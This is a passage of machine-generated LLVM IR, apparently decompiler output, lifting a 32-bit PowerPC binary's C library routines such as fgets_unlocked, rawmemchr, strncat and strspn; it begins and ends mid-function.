dec_label_pc_100145f0:                            ; preds = %dec_label_pc_100145c8, %dec_label_pc_100145b8, %dec_label_pc_100145b0, %dec_label_pc_100145d8
  %v0_100145f4 = load i32, i32* @r28, align 4
  ret i32 %v0_100145f4

; uselistorder directives
  uselistorder i32 %v3_100145a4, { 1, 2, 0 }
  uselistorder i32 %v1_10014554, { 1, 0 }
  uselistorder i32 %v2_10014498, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1002ab90.590 to i32*), { 3, 4, 0, 5, 6, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10030000.1 to i32), { 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26, 9, 1, 27, 3, 2, 10, 4, 11, 28, 12, 29, 5, 13, 30, 31, 32, 33, 34, 14, 15, 7, 6, 8, 16 }
  uselistorder i32* @global_var_1002abe0.708, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__pthread_return_0, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 4, 3, 2, 7, 6, 5, 23, 22, 21, 0, 37, 39, 38, 36, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 19, 20, 1 }
  uselistorder i32 ()* @__pthread_return_void, { 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 6, 5, 4, 3, 2, 16, 15, 14, 13, 12, 11, 1, 0, 45, 44, 49, 48, 47, 46, 43, 42, 8, 7, 10, 9 }
  uselistorder i32 268500992, { 8, 2, 0, 1, 7, 3, 4, 5, 6 }
  uselistorder i16* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100145f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100145a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014588, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10014548, { 1, 0 }
  uselistorder label %dec_label_pc_10014510, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_100146b0, label %dec_label_pc_10014628

dec_label_pc_10014628:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_100146903 = add i32 %arg2, -1
  store i32 %v2_100146903, i32* @r29, align 4
  %v4_100146989 = icmp eq i32 %arg2, 1
  br i1 %v4_100146989, label %dec_label_pc_1001469c, label %dec_label_pc_10014630

dec_label_pc_10014630:                            ; preds = %dec_label_pc_10014628, %dec_label_pc_10014690.backedge
  %v2_1001464c = phi i32 [ %v2_1001464c12, %dec_label_pc_10014690.backedge ], [ %tmp, %dec_label_pc_10014628 ]
  %v0_10014630 = phi i32 [ %v0_10014694, %dec_label_pc_10014690.backedge ], [ %arg3, %dec_label_pc_10014628 ]
  %v1_10014630 = add i32 %v0_10014630, 16
  %v2_10014630 = inttoptr i32 %v1_10014630 to i32*
  %v3_10014630 = load i32, i32* %v2_10014630, align 4
  %v1_10014634 = add i32 %v0_10014630, 24
  %v2_10014634 = inttoptr i32 %v1_10014634 to i32*
  %v3_10014634 = load i32, i32* %v2_10014634, align 4
  %v2_10014638 = add i32 %v3_10014630, 1
  store i32 %v2_10014638, i32* %r11.global-to-local, align 4
  %v3_1001463c = icmp ult i32 %v3_10014630, %v3_10014634
  %v5_1001463c = icmp eq i32 %v3_10014630, %v3_10014634
  store i1 %v5_1001463c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001463c, label %dec_label_pc_10014644, label %dec_label_pc_10014660

dec_label_pc_10014644:                            ; preds = %dec_label_pc_10014630
  %v4_10014630 = inttoptr i32 %v3_10014630 to i8*
  %v3_10014644 = load i8, i8* %v4_10014630, align 1
  %v3_10014648 = icmp eq i8 %v3_10014644, 10
  store i1 %v3_10014648, i1* %cr7_eq.global-to-local, align 1
  %v3_1001464c = inttoptr i32 %v2_1001464c to i8*
  store i8 %v3_10014644, i8* %v3_1001464c, align 1
  %v0_10014650 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014650 = load i32, i32* @r30, align 4
  %v2_10014650 = add i32 %v1_10014650, 16
  %v3_10014650 = inttoptr i32 %v2_10014650 to i32*
  store i32 %v0_10014650, i32* %v3_10014650, align 4
  %v0_10014654 = load i32, i32* @r31, align 4
  %v1_10014654 = add i32 %v0_10014654, 1
  store i32 %v1_10014654, i32* @r31, align 4
  %v0_10014658 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10014658, label %dec_label_pc_1001469c, label %dec_label_pc_10014690.backedge

dec_label_pc_10014660:                            ; preds = %dec_label_pc_10014630
  %v1_1001469410 = inttoptr i32 %v0_10014630 to i16*
  store i32 268519012, i32* @lr, align 4
  %v5_10014660 = call i32 @getc_unlocked(i16* %v1_1001469410, i32 %v3_10014630)
  %v6_10014660 = trunc i32 %v5_10014660 to i8
  %v4_10014664 = icmp eq i8 %v6_10014660, -1
  store i1 %v4_10014664, i1* %cr7_eq.global-to-local, align 1
  %v3_1001466c = icmp eq i8 %v6_10014660, 10
  store i1 %v3_1001466c, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10014664, label %dec_label_pc_10014674, label %dec_label_pc_10014684

dec_label_pc_10014674:                            ; preds = %dec_label_pc_10014660
  %v0_10014674 = load i32, i32* @r30, align 4
  %v1_10014674 = inttoptr i32 %v0_10014674 to i16*
  %v2_10014674 = load i16, i16* %v1_10014674, align 2
  %v1_10014678 = and i16 %v2_10014674, 8
  %v3_10014678 = icmp eq i16 %v1_10014678, 0
  br i1 %v3_10014678, label %dec_label_pc_10014674.dec_label_pc_1001469c_crit_edge, label %dec_label_pc_100146b0

dec_label_pc_10014674.dec_label_pc_1001469c_crit_edge: ; preds = %dec_label_pc_10014674
  %v0_1001469c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001469c

dec_label_pc_10014684:                            ; preds = %dec_label_pc_10014660
  %v3_10014684 = load i32, i32* @r31, align 4
  %v4_10014684 = inttoptr i32 %v3_10014684 to i8*
  store i8 %v6_10014660, i8* %v4_10014684, align 1
  %v0_10014688 = load i32, i32* @r31, align 4
  %v1_10014688 = add i32 %v0_10014688, 1
  store i32 %v1_10014688, i32* @r31, align 4
  %v0_1001468c = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1001468c, label %dec_label_pc_1001469c, label %dec_label_pc_10014690.backedge

dec_label_pc_10014690.backedge:                   ; preds = %dec_label_pc_10014684, %dec_label_pc_10014644
  %v2_1001464c12 = phi i32 [ %v1_10014688, %dec_label_pc_10014684 ], [ %v1_10014654, %dec_label_pc_10014644 ]
  %v0_10014690 = load i32, i32* @r29, align 4
  %v2_10014690 = add i32 %v0_10014690, -1
  store i32 %v2_10014690, i32* @r29, align 4
  %v0_10014694 = load i32, i32* @r30, align 4
  %v4_10014698 = icmp eq i32 %v0_10014690, 1
  br i1 %v4_10014698, label %dec_label_pc_1001469c, label %dec_label_pc_10014630

dec_label_pc_1001469c:                            ; preds = %dec_label_pc_10014684, %dec_label_pc_10014690.backedge, %dec_label_pc_10014644, %dec_label_pc_10014628, %dec_label_pc_10014674.dec_label_pc_1001469c_crit_edge
  %v2_100146a8 = phi i32 [ %v0_1001469c.pre, %dec_label_pc_10014674.dec_label_pc_1001469c_crit_edge ], [ %tmp, %dec_label_pc_10014628 ], [ %v1_10014654, %dec_label_pc_10014644 ], [ %v2_1001464c12, %dec_label_pc_10014690.backedge ], [ %v1_10014688, %dec_label_pc_10014684 ]
  %v1_1001469c = load i32, i32* @r28, align 4
  %v3_1001469c = icmp ugt i32 %v2_100146a8, %v1_1001469c
  %v4_1001469c = icmp eq i32 %v2_100146a8, %v1_1001469c
  store i1 %v4_1001469c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001469c, label %dec_label_pc_100146a4, label %dec_label_pc_100146b0

dec_label_pc_100146a4:                            ; preds = %dec_label_pc_1001469c
  %v3_100146a8 = inttoptr i32 %v2_100146a8 to i8*
  store i8 0, i8* %v3_100146a8, align 1
  %v0_100146b8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100146b4

dec_label_pc_100146b0:                            ; preds = %dec_label_pc_10014674, %dec_label_pc_1001469c, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100146b4

dec_label_pc_100146b4:                            ; preds = %dec_label_pc_100146a4, %dec_label_pc_100146b0
  %v0_100146b8 = phi i32 [ %v0_100146b8.pre, %dec_label_pc_100146a4 ], [ 0, %dec_label_pc_100146b0 ]
  ret i32 %v0_100146b8

; uselistorder directives
  uselistorder i32 %v2_100146a8, { 0, 2, 1 }
  uselistorder i8 %v6_10014660, { 1, 0, 2 }
  uselistorder i32 %v3_10014634, { 1, 0 }
  uselistorder i32 %v3_10014630, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10014630, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8 10, { 2, 3, 0, 1, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100146b4, { 1, 0 }
  uselistorder label %dec_label_pc_100146b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001469c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10014630, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_100146cc = urem i32 %arg1, 256
  store i32 %v1_100146cc, i32* %r4.global-to-local, align 4
  %v0_100146e41 = load i32, i32* @r3, align 4
  %v1_100146e42 = urem i32 %v0_100146e41, 4
  %v3_100146e44 = icmp eq i32 %v1_100146e42, 0
  br i1 %v3_100146e44, label %dec_label_pc_100146ec, label %dec_label_pc_100146d4

dec_label_pc_100146d4:                            ; preds = %entry, %dec_label_pc_100146d4
  %v1_100146d8 = phi i32 [ %v0_100146ec.pre, %dec_label_pc_100146d4 ], [ %v1_100146cc, %entry ]
  %v0_100146d4 = phi i32 [ %v1_100146e0, %dec_label_pc_100146d4 ], [ %v0_100146e41, %entry ]
  %v1_100146d4 = inttoptr i32 %v0_100146d4 to i8*
  %v2_100146d4 = load i8, i8* %v1_100146d4, align 1
  %v3_100146d4 = zext i8 %v2_100146d4 to i32
  %v4_100146d8 = icmp eq i32 %v3_100146d4, %v1_100146d8
  %v0_100146dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100146d8, i32 %v0_100146dc)
  %v0_100146e0 = load i32, i32* @r3, align 4
  %v1_100146e0 = add i32 %v0_100146e0, 1
  store i32 %v1_100146e0, i32* @r3, align 4
  %v1_100146e4 = urem i32 %v1_100146e0, 4
  %v3_100146e4 = icmp eq i32 %v1_100146e4, 0
  %v0_100146ec.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_100146e4, label %dec_label_pc_100146ec, label %dec_label_pc_100146d4

dec_label_pc_100146ec:                            ; preds = %dec_label_pc_100146d4, %entry
  %v0_100147049 = phi i32 [ %v0_100146e41, %entry ], [ %v1_100146e0, %dec_label_pc_100146d4 ]
  %v0_100146ec = phi i32 [ %v1_100146cc, %entry ], [ %v0_100146ec.pre, %dec_label_pc_100146d4 ]
  %v1_100146ec = mul i32 %v0_100146ec, 256
  %v2_100146f4 = or i32 %v1_100146ec, %v0_100146ec
  %v1_100146fc = mul i32 %v2_100146f4, 65536
  %v2_10014700 = or i32 %v1_100146fc, %v2_100146f4
  br label %dec_label_pc_10014704

dec_label_pc_10014704:                            ; preds = %dec_label_pc_10014770, %dec_label_pc_10014704, %dec_label_pc_100146ec
  %v0_10014740 = phi i32 [ %v0_100147049, %dec_label_pc_100146ec ], [ %v1_10014708, %dec_label_pc_10014704 ], [ %v1_10014708, %dec_label_pc_10014770 ]
  %v1_10014704 = inttoptr i32 %v0_10014740 to i32*
  %v2_10014704 = load i32, i32* %v1_10014704, align 4
  %v1_10014708 = add i32 %v0_10014740, 4
  %v1_1001470c = add i32 %v0_10014740, 2
  %v2_10014710 = xor i32 %v2_10014704, %v2_10014700
  %v1_10014718 = add i32 %v2_10014710, 2130640639
  %v2_1001471c = xor i32 %v1_10014718, %v2_10014710
  %v1_10014720 = add i32 %v0_10014740, 1
  %v2_10014724 = and i32 %v2_1001471c, -2130640640
  %v6_10014724 = icmp eq i32 %v2_10014724, -2130640640
  br i1 %v6_10014724, label %dec_label_pc_10014704, label %dec_label_pc_10014730

dec_label_pc_10014730:                            ; preds = %dec_label_pc_10014704
  %v2_10014730 = inttoptr i32 %v0_10014740 to i8*
  %v3_10014730 = load i8, i8* %v2_10014730, align 1
  %v4_10014730 = zext i8 %v3_10014730 to i32
  %v1_10014734 = add i32 %v0_10014740, 3
  %v4_10014738 = icmp eq i32 %v4_10014730, %v0_100146ec
  br i1 %v4_10014738, label %dec_label_pc_10014740, label %dec_label_pc_10014748

dec_label_pc_10014740:                            ; preds = %dec_label_pc_10014730
  ret i32 %v0_10014740

dec_label_pc_10014748:                            ; preds = %dec_label_pc_10014730
  %v2_10014748 = inttoptr i32 %v1_10014720 to i8*
  %v3_10014748 = load i8, i8* %v2_10014748, align 1
  %v4_10014748 = zext i8 %v3_10014748 to i32
  %v4_1001474c = icmp eq i32 %v4_10014748, %v0_100146ec
  br i1 %v4_1001474c, label %dec_label_pc_10014754, label %dec_label_pc_1001475c

dec_label_pc_10014754:                            ; preds = %dec_label_pc_10014748
  ret i32 %v1_10014720

dec_label_pc_1001475c:                            ; preds = %dec_label_pc_10014748
  %v2_1001475c = inttoptr i32 %v1_1001470c to i8*
  %v3_1001475c = load i8, i8* %v2_1001475c, align 1
  %v4_1001475c = zext i8 %v3_1001475c to i32
  %v4_10014760 = icmp eq i32 %v4_1001475c, %v0_100146ec
  br i1 %v4_10014760, label %dec_label_pc_10014768, label %dec_label_pc_10014770

dec_label_pc_10014768:                            ; preds = %dec_label_pc_1001475c
  ret i32 %v1_1001470c

dec_label_pc_10014770:                            ; preds = %dec_label_pc_1001475c
  %v2_10014770 = inttoptr i32 %v1_10014734 to i8*
  %v3_10014770 = load i8, i8* %v2_10014770, align 1
  %v4_10014770 = zext i8 %v3_10014770 to i32
  %v4_10014774 = icmp eq i32 %v4_10014770, %v0_100146ec
  br i1 %v4_10014774, label %dec_label_pc_1001477c, label %dec_label_pc_10014704

dec_label_pc_1001477c:                            ; preds = %dec_label_pc_10014770
  ret i32 %v1_10014734

; uselistorder directives
  uselistorder i32 %v1_10014708, { 1, 0 }
  uselistorder i32 %v0_10014740, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_100146f4, { 1, 0 }
  uselistorder i32 %v0_100146ec, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_100146e0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100146e41, { 2, 1, 0 }
  uselistorder i32 %v1_100146cc, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_100146d4, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10014788

dec_label_pc_10014788:                            ; preds = %dec_label_pc_10014788, %entry
  %v0_10014788 = phi i32 [ %v1_1001478c, %dec_label_pc_10014788 ], [ %tmp, %entry ]
  %v1_10014788 = inttoptr i32 %v0_10014788 to i8*
  %v2_10014788 = load i8, i8* %v1_10014788, align 1
  %v1_1001478c = add i32 %v0_10014788, 1
  store i32 %v1_1001478c, i32* %r11.global-to-local, align 4
  %v3_10014790 = icmp eq i8 %v2_10014788, 0
  store i1 %v3_10014790, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014790, label %dec_label_pc_10014798, label %dec_label_pc_10014788

dec_label_pc_10014798:                            ; preds = %dec_label_pc_10014788
  %v3_10014798 = icmp eq i32 %arg2, 3
  store i1 %v3_10014798, i1* %cr7_eq.global-to-local, align 1
  %v1_1001479c = add i32 %v0_10014788, -1
  store i32 %v1_1001479c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_10014838, label %dec_label_pc_100147a8

dec_label_pc_100147a8:                            ; preds = %dec_label_pc_10014798
  %v1_100147a8 = udiv i32 %arg2, 4
  store i32 %v1_100147a8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100147b0

dec_label_pc_100147b0:                            ; preds = %dec_label_pc_100147b0.dec_label_pc_100147b0_crit_edge, %dec_label_pc_100147a8
  %v2_100147c0 = phi i32 [ %v0_100147b4.pre, %dec_label_pc_100147b0.dec_label_pc_100147b0_crit_edge ], [ %v1_1001479c, %dec_label_pc_100147a8 ]
  %v0_100147b0 = load i32, i32* @r4, align 4
  %v1_100147b0 = inttoptr i32 %v0_100147b0 to i8*
  %v2_100147b0 = load i8, i8* %v1_100147b0, align 1
  %v1_100147b4 = add i32 %v2_100147c0, 1
  store i32 %v1_100147b4, i32* %r9.global-to-local, align 4
  %v1_100147b8 = add i32 %v2_100147c0, 2
  store i32 %v1_100147b8, i32* %r7.global-to-local, align 4
  %v3_100147bc = icmp eq i8 %v2_100147b0, 0
  store i1 %v3_100147bc, i1* %cr7_eq.global-to-local, align 1
  %v4_100147c0 = inttoptr i32 %v1_100147b4 to i8*
  store i8 %v2_100147b0, i8* %v4_100147c0, align 1
  %v0_100147c4 = load i32, i32* @r4, align 4
  %v1_100147c4 = add i32 %v0_100147c4, 1
  store i32 %v1_100147c4, i32* %r11.global-to-local, align 4
  %v0_100147c8 = load i32, i32* @lr, align 4
  %v1_100147c8 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100147c8, i32 %v0_100147c8)
  %v0_100147cc = load i32, i32* @r4, align 4
  %v1_100147cc = add i32 %v0_100147cc, 1
  %v2_100147cc = inttoptr i32 %v1_100147cc to i8*
  %v3_100147cc = load i8, i8* %v2_100147cc, align 1
  %v0_100147d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100147d0 = add i32 %v0_100147d0, 1
  store i32 %v1_100147d0, i32* %r8.global-to-local, align 4
  %v0_100147d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_100147d4 = add i32 %v0_100147d4, 1
  store i32 %v1_100147d4, i32* %r10.global-to-local, align 4
  %v3_100147d8 = icmp eq i8 %v3_100147cc, 0
  store i1 %v3_100147d8, i1* %cr7_eq.global-to-local, align 1
  %v2_100147dc = load i32, i32* %r9.global-to-local, align 4
  %v3_100147dc = add i32 %v2_100147dc, 1
  %v4_100147dc = inttoptr i32 %v3_100147dc to i8*
  store i8 %v3_100147cc, i8* %v4_100147dc, align 1
  %v0_100147e0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100147e0 = add i32 %v0_100147e0, 1
  store i32 %v1_100147e0, i32* %r9.global-to-local, align 4
  %v1_100147e4 = add i32 %v0_100147e0, 2
  store i32 %v1_100147e4, i32* @r4, align 4
  %v0_100147e8 = load i32, i32* @lr, align 4
  %v1_100147e8 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100147e8, i32 %v0_100147e8)
  %v0_100147ec = load i32, i32* %r11.global-to-local, align 4
  %v1_100147ec = add i32 %v0_100147ec, 1
  %v2_100147ec = inttoptr i32 %v1_100147ec to i8*
  %v3_100147ec = load i8, i8* %v2_100147ec, align 1
  %v0_100147f0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100147f0 = add i32 %v0_100147f0, 1
  store i32 %v1_100147f0, i32* %r11.global-to-local, align 4
  %v3_100147f4 = icmp eq i8 %v3_100147ec, 0
  store i1 %v3_100147f4, i1* %cr7_eq.global-to-local, align 1
  %v2_100147f8 = load i32, i32* %r7.global-to-local, align 4
  %v3_100147f8 = add i32 %v2_100147f8, 1
  %v4_100147f8 = inttoptr i32 %v3_100147f8 to i8*
  store i8 %v3_100147ec, i8* %v4_100147f8, align 1
  %v0_100147fc = load i32, i32* @lr, align 4
  %v1_100147fc = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100147fc, i32 %v0_100147fc)
  %v0_10014800 = load i32, i32* %r8.global-to-local, align 4
  %v1_10014800 = add i32 %v0_10014800, 1
  %v2_10014800 = inttoptr i32 %v1_10014800 to i8*
  %v3_10014800 = load i8, i8* %v2_10014800, align 1
  %v4_10014800 = zext i8 %v3_10014800 to i32
  store i32 %v4_10014800, i32* %r9.global-to-local, align 4
  %v3_10014804 = icmp eq i8 %v3_10014800, 0
  store i1 %v3_10014804, i1* %cr7_eq.global-to-local, align 1
  %v2_10014808 = load i32, i32* %r10.global-to-local, align 4
  %v3_10014808 = add i32 %v2_10014808, 1
  %v4_10014808 = inttoptr i32 %v3_10014808 to i8*
  store i8 %v3_10014800, i8* %v4_10014808, align 1
  %v0_1001480c = load i32, i32* @lr, align 4
  %v1_1001480c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1001480c, i32 %v0_1001480c)
  %v0_10014810 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014810 = add i32 %v0_10014810, -1
  store i32 %v1_10014810, i32* %ctr.global-to-local, align 4
  %v2_10014810 = icmp eq i32 %v1_10014810, 0
  br i1 %v2_10014810, label %dec_label_pc_10014814, label %dec_label_pc_100147b0.dec_label_pc_100147b0_crit_edge

dec_label_pc_100147b0.dec_label_pc_100147b0_crit_edge: ; preds = %dec_label_pc_100147b0
  %v0_100147b4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100147b0

dec_label_pc_10014814:                            ; preds = %dec_label_pc_100147b0
  %v0_10014814 = load i32, i32* %r5.global-to-local, align 4
  %v1_10014814 = urem i32 %v0_10014814, 4
  store i32 %v1_10014814, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10014838

dec_label_pc_1001481c:                            ; preds = %dec_label_pc_10014838, %dec_label_pc_1001481c.dec_label_pc_1001481c_crit_edge
  %v0_10014820 = phi i32 [ %v0_10014820.pre, %dec_label_pc_1001481c.dec_label_pc_1001481c_crit_edge ], [ %v0_10014838, %dec_label_pc_10014838 ]
  %v0_1001481c = load i32, i32* @r4, align 4
  %v1_1001481c = inttoptr i32 %v0_1001481c to i8*
  %v2_1001481c = load i8, i8* %v1_1001481c, align 1
  %v3_1001481c = zext i8 %v2_1001481c to i32
  store i32 %v3_1001481c, i32* %r9.global-to-local, align 4
  %v1_10014820 = add i32 %v0_10014820, -1
  store i32 %v1_10014820, i32* %r5.global-to-local, align 4
  %v1_10014824 = add i32 %v0_1001481c, 1
  store i32 %v1_10014824, i32* @r4, align 4
  %v3_10014828 = icmp eq i8 %v2_1001481c, 0
  store i1 %v3_10014828, i1* %cr7_eq.global-to-local, align 1
  %v2_1001482c = load i32, i32* %r11.global-to-local, align 4
  %v3_1001482c = add i32 %v2_1001482c, 1
  %v4_1001482c = inttoptr i32 %v3_1001482c to i8*
  store i8 %v2_1001481c, i8* %v4_1001482c, align 1
  store i32 %v3_1001482c, i32* %r11.global-to-local, align 4
  %v0_10014830 = load i32, i32* @lr, align 4
  %v1_10014830 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10014830, i32 %v0_10014830)
  %v0_10014840 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014840 = add i32 %v0_10014840, -1
  store i32 %v1_10014840, i32* %ctr.global-to-local, align 4
  %v2_10014840 = icmp eq i32 %v1_10014840, 0
  br i1 %v2_10014840, label %dec_label_pc_10014844, label %dec_label_pc_1001481c.dec_label_pc_1001481c_crit_edge

dec_label_pc_1001481c.dec_label_pc_1001481c_crit_edge: ; preds = %dec_label_pc_1001481c
  %v0_10014820.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001481c

dec_label_pc_10014838:                            ; preds = %dec_label_pc_10014798, %dec_label_pc_10014814
  %v0_10014838 = phi i32 [ %arg2, %dec_label_pc_10014798 ], [ %v1_10014814, %dec_label_pc_10014814 ]
  store i32 %v0_10014838, i32* %ctr.global-to-local, align 4
  %v2_100148403 = icmp eq i32 %v0_10014838, 0
  br i1 %v2_100148403, label %dec_label_pc_10014844, label %dec_label_pc_1001481c

dec_label_pc_10014844:                            ; preds = %dec_label_pc_1001481c, %dec_label_pc_10014838
  %v0_10014844 = load i32, i32* %r9.global-to-local, align 4
  %v3_10014844 = icmp eq i32 %v0_10014844, 0
  store i1 %v3_10014844, i1* %cr7_eq.global-to-local, align 1
  %v0_10014848 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10014844, i32 %v0_10014848)
  %v0_1001484c = load i32, i32* %r5.global-to-local, align 4
  %v1_1001484c = trunc i32 %v0_1001484c to i8
  %v2_1001484c = load i32, i32* %r11.global-to-local, align 4
  %v3_1001484c = add i32 %v2_1001484c, 1
  %v4_1001484c = inttoptr i32 %v3_1001484c to i8*
  store i8 %v1_1001484c, i8* %v4_1001484c, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_10014838, { 1, 2, 0 }
  uselistorder i32 %v1_10014840, { 1, 0 }
  uselistorder i32 %v1_10014814, { 1, 0 }
  uselistorder i32 %v1_10014810, { 1, 0 }
  uselistorder i32 %v2_100147c0, { 1, 0 }
  uselistorder i32 %v1_1001478c, { 1, 0 }
  uselistorder i32 %v0_10014788, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 5, 0, 4, 1, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_10014844, { 1, 0 }
  uselistorder label %dec_label_pc_10014838, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100148841 = load i32, i32* @r3, align 4
  %v1_100148842 = inttoptr i32 %v0_100148841 to i8*
  %v2_100148843 = load i8, i8* %v1_100148842, align 1
  %v3_100148886 = icmp eq i8 %v2_100148843, 0
  br i1 %v3_100148886, label %dec_label_pc_10014898, label %dec_label_pc_10014890

dec_label_pc_10014860:                            ; preds = %dec_label_pc_10014860, %dec_label_pc_10014890
  %v0_10014860 = phi i32 [ %v1_10014864, %dec_label_pc_10014860 ], [ %tmp, %dec_label_pc_10014890 ]
  %v1_10014860 = inttoptr i32 %v0_10014860 to i8*
  %v2_10014860 = load i8, i8* %v1_10014860, align 1
  %v1_10014864 = add i32 %v0_10014860, 1
  %v3_10014868 = icmp eq i8 %v2_10014860, 0
  %v4_1001486c = icmp eq i8 %v0_1001486c8.in, %v2_10014860
  %brmerge = or i1 %v3_10014868, %v4_1001486c
  br i1 %brmerge, label %dec_label_pc_10014874, label %dec_label_pc_10014860

dec_label_pc_10014874:                            ; preds = %dec_label_pc_10014860
  br i1 %v3_10014868, label %dec_label_pc_10014898, label %dec_label_pc_1001487c

dec_label_pc_1001487c:                            ; preds = %dec_label_pc_10014874
  %v1_1001487c = add i32 %v0_1001487c, 1
  %v1_10014880 = add i32 %v0_10014880, 1
  %v1_10014884 = inttoptr i32 %v1_10014880 to i8*
  %v2_10014884 = load i8, i8* %v1_10014884, align 1
  %v3_10014888 = icmp eq i8 %v2_10014884, 0
  br i1 %v3_10014888, label %dec_label_pc_10014898, label %dec_label_pc_10014890

dec_label_pc_10014890:                            ; preds = %entry, %dec_label_pc_1001487c
  %v0_10014880 = phi i32 [ %v1_10014880, %dec_label_pc_1001487c ], [ %v0_100148841, %entry ]
  %v0_1001487c = phi i32 [ %v1_1001487c, %dec_label_pc_1001487c ], [ 0, %entry ]
  %v0_1001486c8.in = phi i8 [ %v2_10014884, %dec_label_pc_1001487c ], [ %v2_100148843, %entry ]
  br label %dec_label_pc_10014860

dec_label_pc_10014898:                            ; preds = %dec_label_pc_1001487c, %dec_label_pc_10014874, %entry
